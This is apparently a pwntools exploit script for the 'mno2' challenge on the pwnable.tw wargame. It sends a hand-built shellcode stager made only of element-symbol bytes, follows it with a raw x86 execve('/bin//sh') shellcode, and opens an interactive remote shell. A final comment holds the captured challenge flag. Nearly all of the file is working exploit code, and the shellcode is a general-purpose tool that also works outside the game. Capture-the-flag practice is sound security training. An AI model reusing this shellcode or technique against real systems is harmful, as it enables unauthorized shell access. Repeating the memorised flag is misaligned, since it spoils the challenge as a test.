from pwn import *

elf = ELF("mno2")
r = remote('chall.pwnable.tw', 10301)

intro = b'N3P2' + b'1Pu' + b'SPPSPUSP' + b'a' + b'3Lr6' + b'3Lr8' + b'Pu1' + b'FN' * 0xB + b'F'
xor1 = b'B1' + b'ND' + b'yO4N' + b'4N'  # 3a
outro = b'FN' * 0x7 + b'OOO' + b'CCC' + b'SXe' + b'KKK' + b'F' * 31 + b'O9NN'
outro2 = b'FN' * 0x15 + b'FN' * 8

payload = intro + xor1 + outro + outro2 + b'CaCa'

# le stolen shellcode
shell = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

sleep(3)
r.sendline(payload)
sleep(3)

# send execve shellcode with our generated read call
r.sendline(shell)
r.interactive()

# FLAG --> FLAG{4(7|-||>4|_||\||>|>|_|4|\/|(|\/|b|<(|=35|=|\/||\/|d|\|0|_.-}
